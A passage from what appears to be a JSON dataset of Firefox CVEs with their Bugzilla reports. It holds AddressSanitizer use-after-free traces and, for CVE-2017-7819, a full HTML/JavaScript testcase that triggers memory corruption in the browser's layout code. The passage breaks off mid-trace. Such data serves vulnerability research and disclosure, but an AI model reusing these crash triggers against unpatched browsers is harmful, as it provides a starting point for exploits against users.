/home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:893:22 #29 0x7f4db5ce1f90 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #30 0x7f4db5ce1f90 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #31 0x7f4db5ce1f90 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #32 0x7f4dbe5aba35 in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:709:34 #33 0x4eb5c3 in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:30 #34 0x4eb5c3 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:286 #35 0x7f4dd076582f in __libc_start_main /build/glibc-9tT8Do/glibc-2.23/csu/../csu/libc-start.c:291 previously allocated by thread T0 (Web Content) here: #0 0x4bb79c in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:64:3 #1 0x4ec75d in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7f4dbdc8cd15 in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12 #3 0x7f4dbdc8cd15 in nsTArray<RefPtr<mozilla::a11y::Accessible> >* nsClassHashtable<nsPtrHashKey<mozilla::a11y::Accessible>, nsTArray<RefPtr<mozilla::a11y::Accessible> > >::LookupOrAdd<>(mozilla::a11y::Accessible*) /home/worker/workspace/build/src/obj-firefox/dist/include/nsClassHashtable.h:153 #4 0x7f4dbdc8c163 in mozilla::a11y::DocAccessible::DoARIAOwnsRelocation(mozilla::a11y::Accessible*) /home/worker/workspace/build/src/accessible/generic/DocAccessible.cpp:2044:59 #5 0x7f4dbdbfc9ab in mozilla::a11y::NotificationController::WillRefresh(mozilla::TimeStamp) /home/worker/workspace/build/src/accessible/base/NotificationController.cpp:801:18 #6 0x7f4dbb64f2f5 in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1789:12 #7 0x7f4dbb65da33 in mozilla::RefreshDriverTimer::TickRefreshDrivers(long, mozilla::TimeStamp, nsTArray<RefPtr<nsRefreshDriver> >&) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:300:7 #8 0x7f4dbb65d704 in mozilla::RefreshDriverTimer::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:322:5 #9 0x7f4dbb65fd2b in RunRefreshDrivers /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:752:5 #10 0x7f4dbb65fd2b in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::TickRefreshDriver(mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:665 #11 0x7f4dbb65f92f in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::NotifyVsync(mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:566:9 #12 0x7f4dbbe7dd62 in mozilla::layout::VsyncChild::RecvNotify(mozilla::TimeStamp const&) /home/worker/workspace/build/src/layout/ipc/VsyncChild.cpp:67:16 #13 0x7f4db6152219 in mozilla::layout::PVsyncChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PVsyncChild.cpp:155:20 #14 0x7f4db5e1dafd in mozilla::ipc::PBackgroundChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundChild.cpp:1541:28 #15 0x7f4db5d76ba4 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2021:25 #16 0x7f4db5d73a37 in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1956:17 #17 0x7f4db5d75744 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1825:5 #18 0x7f4db5d75d76 in mozilla::ipc::MessageChannel::MessageTask::Run() /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1858:15 #19 0x7f4db4fe3b40 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1270:14 #20 0x7f4db4fe0588 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:393:10 #21 0x7f4db5d7eb71 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #22 0x7f4db5ce1f90 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #23 0x7f4db5ce1f90 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #24 0x7f4db5ce1f90 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #25 0x7f4dbafbe58f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:27 #26 0x7f4dbe5abf07 in XRE_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:893:22 #27 0x7f4db5ce1f90 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #28 0x7f4db5ce1f90 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #29 0x7f4db5ce1f90 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #30 0x7f4dbe5aba35 in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:709:34 #31 0x4eb5c3 in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:30 #32 0x4eb5c3 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:286 #33 0x7f4dd076582f in __libc_start_main /build/glibc-9tT8Do/glibc-2.23/csu/../csu/libc-start.c:291 SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:398:37 in Length Shadow bytes around the buggy address: 0x0c048002faa0: fa fa 00 00 fa fa 00 00 fa fa fd fd fa fa fd fd 0x0c048002fab0: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fa 0x0c048002fac0: fa fa fd fd fa fa fd fa fa fa fd fd fa fa fd fd 0x0c048002fad0: fa fa fd fa fa fa fd fd fa fa fd fd fa fa fd fd 0x0c048002fae0: fa fa fd fd fa fa fd fd fa fa fd fa fa fa fd fd =>0x0c048002faf0: fa fa fd fd fa fa fd fd fa fa fd fd fa fa[fd]fa 0x0c048002fb00: fa fa fd fd fa fa 00 00 fa fa 00 00 fa fa 00 00 0x0c048002fb10: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd 0x0c048002fb20: fa fa 00 00 fa fa fd fd fa fa fd fd fa fa 00 00 0x0c048002fb30: fa fa 00 00 fa fa fd fd fa fa fd fd fa fa fd fd 0x0c048002fb40: fa fa fd fd fa fa 00 00 fa fa 00 00 fa fa 00 fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==12988==ABORTING"
      }
    ],
    "CVE-2017-7819": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1380292",
        "title": "heap-use-after-free in ~nsStyleContext, nsFrameManager::CaptureFrameState etc",
        "description": "The following testcase crashes the latest ASAN build of Firefox (BuildID=20170711160010). The attached crash.html, crash.xml and crash.xsl have to be served from an HTTP server. crash.html: <script> function spin() { var x=new XMLHttpRequest(); x.open(\"POST\",\"https://mozilla.org\",false); try{x.send(\"X\");}catch(e){} } function start() { o0=document.createElement('iframe'); o0.src='crash.xml'; document.body.appendChild(o0); o1=document.createElement('iframe'); o1.src='data:text/html,<div>'; o0.addEventListener('load', fun0,false); document.body.appendChild(o1); o2=window.document; } function fun0() { o4=o1.contentWindow; o4.onresize=fun1; o16=o0.contentWindow; o17=o0.contentDocument; tmp=o17.getElementsByTagName('*'); o18=tmp[0]; o28=tmp[4]; o62=o17.createRange(); o17.designMode='on'; document.documentElement.appendChild(o18); o95=o16.getSelection(); o95.addRange(o62); o1.setAttribute('height','-9px'); o213=document.createElement('style'); o62.selectNodeContents(o28); document.documentElement.style.transform='scale(100)'; o2.designMode='on'; document.documentElement.appendChild(o213); o1.setAttribute('height','-9px'); spin(); o95.modify('extend', 'forward','lineboundary'); } function fun1() { o268=document.createElement('iframe'); o268.addEventListener('load', fun2,false); o213.appendChild(o268); } function fun2() { document.body.appendChild(o0); o0.appendChild(o1); fuzzPriv.GC();fuzzPriv.CC();fuzzPriv.GC();fuzzPriv.CC(); location.reload(); } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==6893==ERROR: AddressSanitizer: heap-use-after-free on address 0x625000380ce8 at pc 0x7efbe71a2dc0 bp 0x7fffb2c01f30 sp 0x7fffb2c01f28 READ of size 8 at 0x625000380ce8 thread T0 (Web Content) #0 0x7efbe71a2dbf in GetStateBits /home/worker/workspace/build/src/layout/generic/nsIFrame.h:1997:46 #1 0x7efbe71a2dbf in nsFrameManager::CaptureFrameState(nsIFrame*, nsILayoutHistoryState*) /home/worker/workspace/build/src/layout/base/nsFrameManager.cpp:497 #2 0x7efbe71a2b7c in nsFrameManager::CaptureFrameState(nsIFrame*, nsILayoutHistoryState*) /home/worker/workspace/build/src/layout/base/nsFrameManager.cpp:504:7 #3 0x7efbe71a2b7c in nsFrameManager::CaptureFrameState(nsIFrame*, nsILayoutHistoryState*) /home/worker/workspace/build/src/layout/base/nsFrameManager.cpp:504:7 #4 0x7efbe71a2b7c in nsFrameManager::CaptureFrameState(nsIFrame*, nsILayoutHistoryState*) /home/worker/workspace/build/src/layout/base/nsFrameManager.cpp:504:7 #5 0x7efbe71a2b7c in nsFrameManager::CaptureFrameState(nsIFrame*, nsILayoutHistoryState*) /home/worker/workspace/build/src/layout/base/nsFrameManager.cpp:504:7 #6 0x7efbe71a2b7c in nsFrameManager::CaptureFrameState(nsIFrame*, nsILayoutHistoryState*) /home/worker/workspace/build/src/layout/base/nsFrameManager.cpp:504:7 #7 0x7efbe70ea933 in mozilla::PresShell::CaptureHistoryState(nsILayoutHistoryState**) /home/worker/workspace/build/src/layout/base/PresShell.cpp:3876:22 #8 0x7efbea114525 in nsDocShell::PersistLayoutHistoryState() /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:12768:19 #9 0x7efbea1216fb in nsDocShell::Embed(nsIContentViewer*, char const*, nsISupports*) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7315:3 #10 0x7efbea0b9521 in nsDocShell::CreateContentViewer(nsACString const&, nsIRequest*, nsIStreamListener**) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:9297:3 #11 0x7efbea0b742e in nsDSURIContentListener::DoContent(nsACString const&, bool, nsIRequest*, nsIStreamListener**, bool*) /home/worker/workspace/build/src/docshell/base/nsDSURIContentListener.cpp:114:21 #12 0x7efbe1f33397 in nsDocumentOpenInfo::TryContentListener(nsIURIContentListener*, nsIChannel*) /home/worker/workspace/build/src/uriloader/base/nsURILoader.cpp:756:28 #13 0x7efbe1f304cc in nsDocumentOpenInfo::DispatchContent(nsIRequest*, nsISupports*) /home/worker/workspace/build/src/uriloader/base/nsURILoader.cpp:434:30 #14 0x7efbe1f2ec40 in nsDocumentOpenInfo::OnStartRequest(nsIRequest*, nsISupports*) /home/worker/workspace/build/src/uriloader/base/nsURILoader.cpp:296:8 #15 0x7efbe0dd5ae6 in mozilla::net::HttpChannelChild::DoOnStartRequest(nsIRequest*, nsISupports*) /home/worker/workspace/build/src/netwerk/protocol/http/HttpChannelChild.cpp:662:28 #16 0x7efbe0de168c in mozilla::net::HttpChannelChild::OnStartRequest(nsresult const&, mozilla::net::nsHttpResponseHead const&, bool const&, mozilla::net::nsHttpHeaderArray const&, bool const&, bool const&, int const&, unsigned int const&, unsigned int const&, nsCString const&, nsCString const&, mozilla::net::NetAddr const&, mozilla::net::NetAddr const&, unsigned int const&, nsCString const&, long const&) /home/worker/workspace/build/src/netwerk/protocol/http/HttpChannelChild.cpp:593:3 #17 0x7efbe0ebbb0c in mozilla::net::StartRequestEvent::Run() /home/worker/workspace/build/src/netwerk/protocol/http/HttpChannelChild.cpp:425:13 #18 0x7efbe0cba127 in mozilla::net::ChannelEventQueue::RunOrEnqueue(mozilla::net::ChannelEvent*, bool) /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/net/ChannelEventQueue.h:215:10 #19 0x7efbe0de06a0 in mozilla::net::HttpChannelChild::RecvOnStartRequest(nsresult const&, mozilla::net::nsHttpResponseHead const&, bool const&, mozilla::net::nsHttpHeaderArray const&, bool const&, bool const&, int const&, unsigned int const&, unsigned int const&, nsCString const&, nsCString const&, mozilla::net::NetAddr const&, mozilla::net::NetAddr const&, short const&, unsigned int const&, nsCString const&, long const&) /home/worker/workspace/build/src/netwerk/protocol/http/HttpChannelChild.cpp:482:12 #20 0x7efbe13f4576 in mozilla::net::PHttpChannelChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PHttpChannelChild.cpp:637:20 #21 0x7efbe19f4c5d in mozilla::dom::PContentChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PContentChild.cpp:5296:28 #22 0x7efbe123018e in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2093:25 #23 0x7efbe122d2d4 in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2019:17 #24 0x7efbe122ebb4 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1888:5 #25 0x7efbe122f198 in mozilla::ipc::MessageChannel::MessageTask::Run() /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1921:15 #26 0x7efbe03f2490 in mozilla::SchedulerGroup::Runnable::Run() /home/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:367:25 #27 0x7efbe041f875 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1437:14 #28 0x7efbe0425aa8 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:489:10 #29 0x7efbe1237e36 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:125:5 #30 0x7efbe11940e0 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:320:10 #31 0x7efbe11940e0 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:313 #32 0x7efbe11940e0 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:293 #33 0x7efbe69c237f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:27 #34 0x7efbeac50817 in XRE_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:895:22 #35 0x7efbe11940e0 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:320:10 #36 0x7efbe11940e0 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:313 #37 0x7efbe11940e0 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:293 #38 0x7efbeac5027d in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:711:34 #39 0x4eb813 in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:30 #40 0x4eb813 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:286 #41 0x7efbfd7d882f in __libc_start_main /build/glibc-bfm8X4/glibc-2.23/csu/../csu/libc-start.c:291 #42 0x41d168 in _start (/home/nils/fuzzer3/firefox/firefox+0x41d168) 0x625000380ce8 is located 7144 bytes inside of 8192-byte region [0x62500037f100,0x625000381100) freed by thread T0 (Web Content) here: #0 0x4bb69b in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:47:3 #1 0x7efbe7238d10 in Clear /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/ArenaAllocator.h:98:7 #2 0x7efbe7238d10 in ~ArenaAllocator /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/ArenaAllocator.h:61 #3 0x7efbe7238d10 in nsPresArena::~nsPresArena() /home/worker/workspace/build/src/layout/base/nsPresArena.cpp:42 #4 0x7efbe70cdb43 in nsIPresShell::~nsIPresShell() /home/worker/workspace/build/src/obj-firefox/dist/include/nsIPresShell.h:178:7 #5 0x7efbe70cdc7d in mozilla::PresShell::~PresShell() /home/worker/workspace/build/src/layout/base/PresShell.cpp:900:1 #6 0x7efbe70c93ef in Release /home/worker/workspace/build/src/layout/base/PresShell.cpp:894:1 #7 0x7efbe70c93ef in non-virtual thunk to mozilla::PresShell::Release() /home/worker/workspace/build/src/layout/base/PresShell.cpp:894 #8 0x7efbe6ab9425 in ~nsCOMPtr_base /home/worker/workspace/build/src/obj-firefox/dist/include/nsCOMPtr.h:294:7 #9 0x7efbe6ab9425 in nsTextServicesDocument::~nsTextServicesDocument() /home/worker/workspace/build/src/editor/txtsvc/nsTextServicesDocument.cpp:96 #10 0x7efbe6ab981d in nsTextServicesDocument::~nsTextServicesDocument() /home/worker/workspace/build/src/editor/txtsvc/nsTextServicesDocument.cpp:94:1 #11 0x7efbe02bbc47 in SnowWhiteKiller::~SnowWhiteKiller() /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2661:25 #12 0x7efbe02c5dd4 in FreeSnowWhite /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2849:3 #13 0x7efbe02c5dd4 in nsCycleCollector_doDeferredDeletion() /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:4187 #14 0x7efbe1cf0e13 in AsyncFreeSnowWhite::Run() /home/worker/workspace/build/src/js/xpconnect/src/XPCJSRuntime.cpp:126:34 #15 0x7efbe0434a7f in IdleRunnableWrapper::Run() /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:313:22 #16 0x7efbe041f875 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1437:14 #17 0x7efbe0425aa8 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:489:10 #18 0x7efbe1237e41 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:97:21 #19 0x7efbe11940e0 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:320:10 #20 0x7efbe11940e0 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:313 #21 0x7efbe11940e0 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:293 #22 0x7efbe69c237f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:27 #23 0x7efbeac50817 in XRE_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:895:22 #24 0x7efbe11940e0 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:320:10 #25 0x7efbe11940e0 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:313 #26 0x7efbe11940e0 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:293 #27 0x7efbeac5027d in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:711:34 #28 0x4eb813 in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:30 #29 0x4eb813 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:286 #30 0x7efbfd7d882f in __libc_start_main /build/glibc-bfm8X4/glibc-2.23/csu/../csu/libc-start.c:291 previously allocated by thread T0 (Web Content) here: #0 0x4bb9ec in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:64:3 #1 0x7efbe03d6fdf in AllocateChunk /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/ArenaAllocator.h:179:15 #2 0x7efbe03d6fdf in InternalAllocate /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/ArenaAllocator.h:214 #3 0x7efbe03d6fdf in Allocate /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/ArenaAllocator.h:72 #4 0x7efbe03d6fdf in mozilla::ArenaAllocator<8192ul, 8ul>::Allocate(unsigned long) /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/ArenaAllocator.h:77 #5 0x7efbe6f53430 in AllocateByObjectID /home/worker/workspace/build/src/layout/base/nsPresArena.h:51:12 #6 0x7efbe6f53430 in AllocateByObjectID /home/worker/workspace/build/src/obj-firefox/dist/include/nsIPresShell.h:237 #7 0x7efbe6f53430 in operator new /home/worker/workspace/build/src/layout/style/nsRuleNode.cpp:1788 #8 0x7efbe6f53430 in nsRuleNode::Transition(nsIStyleRule*, mozilla::SheetType, bool) /home/worker/workspace/build/src/layout/style/nsRuleNode.cpp:1900 #9 0x7efbe6e89e1d in DoForward /home/worker/workspace/build/src/layout/style/nsRuleWalker.h:31:26 #10 0x7efbe6e89e1d in Forward /home/worker/workspace/build/src/layout/style/nsRuleWalker.h:42 #11 0x7efbe6e89e1d in ContentEnumFunc(RuleValue const&, nsCSSSelector*, ElementDependentRuleProcessorData*, NodeMatchContext&, AncestorFilter*) /home/worker/workspace/build/src/layout/style/nsCSSRuleProcessor.cpp:2606 #12 0x7efbe6e8946a in RuleHash::EnumerateAllRules(mozilla::dom::Element*, ElementDependentRuleProcessorData*, NodeMatchContext&) /home/worker/workspace/build/src/layout/style/nsCSSRuleProcessor.cpp:697:7 #13 0x7efbe6e94a1f in nsCSSRuleProcessor::RulesMatching(ElementRuleProcessorData*) /home/worker/workspace/build/src/layout/style/nsCSSRuleProcessor.cpp:2620:24 #14 0x7efbe6fe584c in bool EnumRulesMatching<ElementRuleProcessorData>(nsIStyleRuleProcessor*, void*) /home/worker/workspace/build/src/layout/style/nsStyleSet.cpp:795:15 #15 0x7efbe6fe285d in nsStyleSet::FileRules(bool (*)(nsIStyleRuleProcessor*, void*), RuleProcessorData*, mozilla::dom::Element*, nsRuleWalker*) /home/worker/workspace/build/src/layout/style/nsStyleSet.cpp:1121:5 #16 0x7efbe6fe545e in nsStyleSet::ResolveStyleForInternal(mozilla::dom::Element*, nsStyleContext*, TreeMatchContext&, nsStyleSet::AnimationFlag) /home/worker/workspace/build/src/layout/style/nsStyleSet.cpp:1353:3 #17 0x7efbe6fe5050 in nsStyleSet::ResolveStyleFor(mozilla::dom::Element*, nsStyleContext*, TreeMatchContext&) /home/worker/workspace/build/src/layout/style/nsStyleSet.cpp:1389:10 #18 0x7efbe70ae366 in mozilla::ElementRestyler::RestyleSelf(nsIFrame*, nsRestyleHint, unsigned int*, nsTArray<mozilla::ElementRestyler::SwapInstruction>&) /home/worker/workspace/build/src/layout/base/GeckoRestyleManager.cpp:2545:32 #19 0x7efbe70a9c92 in mozilla::ElementRestyler::Restyle(nsRestyleHint) /home/worker/workspace/build/src/layout/base/GeckoRestyleManager.cpp:1795:7 #20 0x7efbe70b5ceb in mozilla::ElementRestyler::ComputeStyleChangeFor(nsIFrame*, nsStyleChangeList*, nsChangeHint, mozilla::RestyleTracker&, nsRestyleHint, mozilla::RestyleHintData const&, nsTArray<mozilla::ElementRestyler::ContextToClear>&, nsTArray<RefPtr<nsStyleContext> >&) /home/worker/workspace/build/src/layout/base/GeckoRestyleManager.cpp:3063:16 #21 0x7efbe709ff62 in mozilla::GeckoRestyleManager::ComputeAndProcessStyleChange(nsIFrame*, nsChangeHint, mozilla::RestyleTracker&, nsRestyleHint, mozilla::RestyleHintData const&) /home/worker/workspace/build/src/layout/base/GeckoRestyleManager.cpp:3474:3 #22 0x7efbe709f4be in mozilla::GeckoRestyleManager::RestyleElement(mozilla::dom::Element*, nsIFrame*, nsChangeHint, mozilla::RestyleTracker&, nsRestyleHint, mozilla::RestyleHintData const&) /home/worker/workspace/build/src/layout/base/GeckoRestyleManager.cpp:151:5 #23 0x7efbe7127dff in ProcessOneRestyle /home/worker/workspace/build/src/layout/base/RestyleTracker.cpp:94:22 #24 0x7efbe7127dff in mozilla::RestyleTracker::DoProcessRestyles() /home/worker/workspace/build/src/layout/base/RestyleTracker.cpp:255 #25 0x7efbe70a3906 in ProcessRestyles /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/GeckoRestyleManager.h:371:23 #26 0x7efbe70a3906 in mozilla::GeckoRestyleManager::ProcessPendingRestyles() /home/worker/workspace/build/src/layout/base/GeckoRestyleManager.cpp:502 #27 0x7efbe70ecf7e in ProcessPendingRestyles /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RestyleManagerInlines.h:44:3 #28 0x7efbe70ecf7e in mozilla::PresShell::DoFlushPendingNotifications(mozilla::ChangesToFlush) /home/worker/workspace/build/src/layout/base/PresShell.cpp:4193 #29 0x7efbe70dba12 in mozilla::PresShell::DidDoReflow(bool) /home/worker/workspace/build/src/layout/base/PresShell.cpp:9164:3 #30 0x7efbe70ee2a8 in mozilla::PresShell::ProcessReflowCommands(bool) /home/worker/workspace/build/src/layout/base/PresShell.cpp:9521:7 #31 0x7efbe70ed154 in mozilla::PresShell::DoFlushPendingNotifications(mozilla::ChangesToFlush) /home/worker/workspace/build/src/layout/base/PresShell.cpp:4230:11 #32 0x7efbe71c4521 in FlushPendingNotifications /home/worker/workspace/build/src/obj-firefox/dist/include/nsIPresShell.h:578:5 #33 0x7efbe71c4521 in nsDocumentViewer::LoadComplete(nsresult) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1033 #34 0x7efbea1292aa in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7698:21 #35 0x7efbea1252b0 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7496:7 #36 0x7efbea12ca3f in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7393:13 #37 0x7efbe1f267e2 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1299:3 #38 0x7efbe1f257dc in nsDocLoader::doStopDocumentLoad(nsIRequest*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:860:14 #39 0x7efbe1f225d8 in nsDocLoader::DocLoaderIsEmpty(bool) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:749:9 #40 0x7efbe1f244ef in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:631:5 #41 0x7efbe1f2521c in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:487:14 SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/layout/generic/nsIFrame.h:1997:46 in GetStateBits Shadow bytes around the buggy address: 0x0c4a80068140: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a80068150: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a80068160: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a80068170: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a80068180: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd =>0x0c4a80068190: fd fd fd fd fd fd fd fd fd fd fd fd fd[fd]fd fd 0x0c4a800681a0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a800681b0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a800681c0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a800681d0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c4a800681e0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd Shadow byte legend (one shadow byte 